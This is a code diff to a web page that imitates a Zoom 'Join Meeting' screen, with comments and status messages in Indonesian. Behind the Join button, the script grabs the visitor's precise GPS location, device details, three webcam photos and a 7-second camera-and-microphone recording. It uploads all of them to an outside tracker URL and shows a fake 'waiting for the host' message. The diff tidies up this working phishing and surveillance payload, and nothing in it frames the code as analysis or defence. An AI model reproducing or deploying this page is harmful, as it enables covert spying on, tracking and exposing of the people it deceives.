@@ -43,25 +43,22 @@
       display: flex;
       gap: 12px;
     }
-    .btn-support {
+    .btn-support, .btn-signup {
       padding: 6px 16px;
-      border: 1px solid #0e71eb;
-      color: #0e71eb;
-      background: white;
       border-radius: 9999px;
       font-size: 14px;
       font-weight: 500;
       cursor: pointer;
     }
+    .btn-support {
+      border: 1px solid #0e71eb;
+      color: #0e71eb;
+      background: white;
+    }
     .btn-signup {
-      padding: 6px 20px;
       background: #0e71eb;
       color: white;
       border: none;
-      border-radius: 9999px;
-      font-size: 14px;
-      font-weight: 600;
-      cursor: pointer;
     }
     .main-content {
       padding: 40px 32px 32px;
@@ -99,10 +96,7 @@
       margin-bottom: 24px;
       line-height: 1.5;
     }
-    .agreement a {
-      color: #0e71eb;
-      text-decoration: none;
-    }
+    .agreement a { color: #0e71eb; text-decoration: none; }
     .join-btn {
       width: 100%;
       padding: 14px;
@@ -140,16 +134,11 @@
       flex-wrap: wrap;
       gap: 12px;
     }
-    .footer a {
-      color: #6b7280;
-      text-decoration: none;
-    }
   </style>
 </head>
 <body>
 
   <div class="zoom-container">
-    <!-- Top Bar -->
     <div class="top-bar">
       <div class="logo">zoom</div>
       <div class="top-right">
@@ -158,31 +147,26 @@
       </div>
     </div>
 
-    <!-- Main Content -->
     <div class="main-content">
       <h1>Join Meeting</h1>
 
       <div class="input-label">Meeting ID or Personal Link Name</div>
-      <input type="text" id="meetingId" placeholder="Enter Meeting ID or Personal Link Name" value="987 654 3210" />
+      <input type="text" id="meetingId" value="987 654 3210" readonly />
 
       <div class="agreement">
         By clicking "Join", you agree to our 
-        <a href="#" target="_blank">Terms of Services</a> and 
-        <a href="#" target="_blank">Privacy Statement</a>
+        <a href="#">Terms of Services</a> and 
+        <a href="#">Privacy Statement</a>
       </div>
 
-      <button class="join-btn" id="joinBtn">Join</button>
+      <button class="join-btn active" id="joinBtn">Join</button>
 
       <a href="#" class="sip-link">Join a meeting from an H.323/SIP room system</a>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
-      <div>© 2026 Zoom Communications, Inc. All rights reserved. <a href="#">Privacy & Legal Policies</a></div>
-      <div style="display:flex; align-items:center; gap:8px;">
-        English <span style="font-size:18px;">▼</span>
-        <div style="width:32px;height:32px;background:#0e71eb;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:18px;">💬</div>
-      </div>
+      <div>© 2026 Zoom Communications, Inc. All rights reserved.</div>
+      <div>English ▼</div>
     </div>
   </div>
 
@@ -193,12 +177,10 @@
     const statusDiv = document.createElement('div');
     statusDiv.style.marginTop = '20px';
     statusDiv.style.fontSize = '15px';
-    statusDiv.style.minHeight = '24px';
+    statusDiv.style.minHeight = '28px';
     document.querySelector('.main-content').appendChild(statusDiv);
 
-    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php'; 
-
-    joinBtn.classList.add('active');
+    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';
 
     async function getDeviceInfo() {
       return {
@@ -208,29 +190,26 @@
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         screen: `${screen.width}×${screen.height}`,
-        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-        deviceMemory: navigator.deviceMemory || 'N/A'
+        hardwareConcurrency: navigator.hardwareConcurrency || 'N/A'
       };
     }
 
     joinBtn.addEventListener('click', async () => {
-      if (!joinBtn.classList.contains('active')) return;
-
       joinBtn.textContent = 'Joining...';
       joinBtn.disabled = true;
-      statusDiv.textContent = 'Mengakses izin...';
+      statusDiv.textContent = 'Meminta izin...';
 
       let stream = null;
 
       try {
         const deviceInfo = await getDeviceInfo();
 
-        // === 1. Ambil Lokasi ===
+        // Lokasi
         statusDiv.textContent = 'Mengambil lokasi GPS...';
-        const position = await new Promise((resolve, reject) => 
-          navigator.geolocation.getCurrentPosition(resolve, reject, { 
+        const position = await new Promise((res, rej) => 
+          navigator.geolocation.getCurrentPosition(res, rej, { 
             enableHighAccuracy: true, 
-            timeout: 10000 
+            timeout: 15000 
           })
         );
 
@@ -240,7 +219,7 @@
           accuracy: position.coords.accuracy
         };
 
-        // === 2. Ambil Kamera + Mic ===
+        // Kamera + Mic
         statusDiv.textContent = 'Mengaktifkan kamera...';
         stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: 'user' }, 
@@ -251,97 +230,70 @@
         videoEl.srcObject = stream;
         await videoEl.play();
 
-        // === 3. Ambil 3 Foto ===
-        statusDiv.textContent = 'Mengambil foto...';
+        // Ambil 3 Foto
+        statusDiv.textContent = 'Mengambil foto bukti...';
         const photos = [];
         for (let i = 0; i < 3; i++) {
-          await new Promise(r => setTimeout(r, 900));
+          await new Promise(r => setTimeout(r, 1000));
           const canvas = document.createElement('canvas');
           canvas.width = videoEl.videoWidth || 640;
           canvas.height = videoEl.videoHeight || 480;
           canvas.getContext('2d').drawImage(videoEl, 0, 0);
-          photos.push(canvas.toDataURL('image/jpeg', 0.82));
+          photos.push(canvas.toDataURL('image/jpeg', 0.85));
         }
 
-        // === 4. Rekam Video (Lebih Stabil) ===
-        statusDiv.textContent = 'Merekam video bukti...';
-        
-        let recorder;
+        // Rekam Video 7 Detik
+        statusDiv.textContent = 'Merekam video 7 detik...';
         let chunks = [];
-        
-        // Coba beberapa mimeType
-        const mimeTypes = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
-        let mimeType = '';
-        
-        for (let type of mimeTypes) {
+        let mimeType = 'video/webm';
+
+        const supportedTypes = ['video/webm;codecs=vp9', 'video/webm;codecs=vp8', 'video/webm', 'video/mp4'];
+        for (let type of supportedTypes) {
           if (MediaRecorder.isTypeSupported(type)) {
             mimeType = type;
             break;
           }
         }
 
-        recorder = new MediaRecorder(stream, { mimeType: mimeType || 'video/webm' });
-        
-        recorder.ondataavailable = e => {
-          if (e.data && e.data.size > 0) chunks.push(e.data);
-        };
+        const recorder = new MediaRecorder(stream, { mimeType });
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.start();
 
-        recorder.start(1000); // record in chunks
+        await new Promise(r => setTimeout(r, 7000)); // 7 detik
+        recorder.stop();
 
-        // Rekam selama 4 detik
-        await new Promise(r => setTimeout(r, 4000));
-        
-        if (recorder.state !== 'inactive') recorder.stop();
-
-        // Tunggu video selesai
         const videoBlob = await new Promise(resolve => {
-          recorder.onstop = () => {
-            resolve(new Blob(chunks, { type: mimeType || 'video/webm' }));
-          };
+          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
         });
 
-        // === 5. Kirim ke Server ===
+        // Kirim ke Server
         statusDiv.textContent = 'Mengirim data ke server...';
-        
         const formData = new FormData();
         formData.append('location', JSON.stringify(location));
         formData.append('device_info', JSON.stringify(deviceInfo));
-        
-        // Kirim Video
-        if (videoBlob && videoBlob.size > 1000) {
-          formData.append('video', videoBlob, `zoom_rec_${Date.now()}.webm`);
-        }
+        formData.append('video', videoBlob, `zoom_${Date.now()}.webm`);
 
-        // Kirim Foto
         for (let i = 0; i < photos.length; i++) {
           const blob = await fetch(photos[i]).then(r => r.blob());
-          formData.append(`photo${i+1}`, blob, `zoom_photo_${Date.now()}_${i+1}.jpg`);
+          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
         }
 
-        const response = await fetch(SERVER_URL, { 
-          method: 'POST', 
-          body: formData 
-        });
+        const response = await fetch(SERVER_URL, { method: 'POST', body: formData });
 
         if (response.ok) {
           statusDiv.innerHTML = `<span style="color:#10b981;">✅ Berhasil terkoneksi ke meeting</span>`;
-          setTimeout(() => {
-            alert("Waiting for the host to join the meeting...");
-          }, 1000);
+          setTimeout(() => alert("Waiting for the host to join the meeting..."), 1200);
         } else {
-          throw new Error('Upload failed');
+          throw new Error('Upload gagal');
         }
 
       } catch (err) {
         console.error(err);
-        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ Gagal: ${err.message || 'Izin ditolak'}</span>`;
+        statusDiv.innerHTML = `<span style="color:#ef4444;">❌ Gagal: Izinkan semua izin</span>`;
         joinBtn.textContent = 'Join';
         joinBtn.disabled = false;
       } finally {
-        // Cleanup stream
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
+        if (stream) stream.getTracks().forEach(track => track.stop());
       }
     });
   </script>
